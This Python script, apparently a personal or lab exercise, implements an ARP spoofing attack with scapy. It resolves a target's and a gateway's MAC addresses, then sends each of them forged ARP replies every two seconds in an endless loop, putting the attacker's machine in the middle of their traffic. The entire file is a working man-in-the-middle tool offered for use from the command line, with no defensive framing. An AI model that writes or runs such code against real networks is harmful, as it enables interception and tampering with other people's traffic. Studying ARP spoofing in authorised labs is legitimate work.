# ARP spoofer
#
# Command: sudo python3 arpspoof.py <targetIP> <gatewayIP>
#
# File name: arpspoof.py


from datetime import datetime
import sys
from scapy.layers.l2 import Ether, ARP, srp1, sendp, get_if_addr, conf
import time




# Define variables
author = "Jotham"
current_date = datetime.now().strftime("%d/%m/%Y")

# Display the output
print(f"Author: {author}")
print(f"Date: {current_date}")




def reqMACAddress(IP):
	# Layer 2 frame
	frame = Ether(dst="ff:ff:ff:ff:ff:ff")
	
	# ARP request payload
	arp = ARP(pdst=IP)
	
	# Broadcast ARP request
	reply_arp_req = srp1(frame / arp, timeout=5) #, verbose=False)
	
	
	if reply_arp_req is None:
		raise ValueError(f"{IP} is not found")


	return reply_arp_req.hwsrc
	
	
	


def arpspoof(targetIP, gatewayIP):
	# If IP is not found... 
	try:
		targetMAC = reqMACAddress(targetIP)
		gatewayMAC = reqMACAddress(gatewayIP)
		
	except ValueError as e:
		print(f"Error: {e}")
		sys.exit(1)	# Quit program
	
	
	#local_IP = get_if_addr(conf.iface)	# no need to find local IP
	
	
	# Start spoof
	print("Starting spoof...\n")
	
	count = 0
	try:		
		while True:
			
			# Fool target
			targetPkt = Ether(dst=targetMAC) / ARP(op=2, pdst=targetIP, psrc=gatewayIP)
			bluff_target = sendp(targetPkt)
			print(f"Sending to {targetIP}: {gatewayIP} is at {targetPkt.src}")
			
			# Fool gateway
			gatewayPkt = Ether(dst=gatewayMAC) / ARP(op=2, pdst=gatewayIP, psrc=targetIP)
			bluff_gateway = sendp(gatewayPkt)
			print(f"Sending to {gatewayIP}: {targetIP} is at {gatewayPkt.src}")
			
			count += 1
			
			# Slow down the number of packets sent
			time.sleep(2)
			print()
	
	except KeyboardInterrupt:
		pass
		
	print(f"\n\nTotal of {count*2} arp responses sent")	
	
	return	
	
	
	
	
		
def test():
	MACAddress1 = reqMACAddress("10.0.2.3")
	print(MACAddress1)




def main():
	# Take in CLI arguments
	try:
		targetIP = sys.argv[1].strip()
		gatewayIP = sys.argv[2].strip()
	
	except IndexError:
		print("Error: Missing target/gateway IP arguments")
		sys.exit(2)
	
	
	arpspoof(targetIP, gatewayIP)
	
	print("Stop spoofing")
	
	return

if __name__ == "__main__":
	main()
	# test()
